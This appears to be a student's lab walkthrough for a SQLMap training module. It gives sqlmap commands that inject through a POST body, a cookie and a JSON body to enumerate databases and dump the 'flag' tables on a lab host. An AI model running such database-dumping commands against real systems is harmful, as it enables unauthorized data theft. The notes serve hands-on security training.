# [Running SQLMap on an HTTP Request](Running%20SQLMap%20on%20an%20HTTP%20Request.md)
### What's the contents of table flag2? (Case #2)

```shell
sqlmap -u 'http://154.57.164.71:30229/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs
```
![](Screenshot%202026-06-22%20at%2012.36.27.png)

```shell
sqlmap -u 'http://154.57.164.71:30229/case2.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://154.57.164.71:30229/case2.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://154.57.164.71:30229' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'id=1' -D testdb -T flag2 --dump
```
![](Screenshot%202026-06-22%20at%2012.38.33.png)
### What's the contents of table flag3? (Case #3)

```shell
sqlmap -u 'http://154.57.164.71:30229/case3.php' --cookie 'id=1*' -T flag3 --dump
```
![](Screenshot%202026-06-22%20at%2012.46.09.png)
### What's the contents of table flag4? (Case #4)

```shell
sqlmap -u 'http://154.57.164.71:30229/case4.php'   --compressed   -X POST   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0'   -H 'Accept: */*'   -H 'Accept-Language: en-US,en;q=0.5'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://154.57.164.71:30229/case4.php'   -H 'Content-Type: application/json'   -H 'Origin: http://154.57.164.71:30229'   -H 'DNT: 1'   -H 'Connection: keep-alive'   --data-raw '{"id":1}' -T flag4 --dump
```
![](Screenshot%202026-06-22%20at%2012.48.47.png)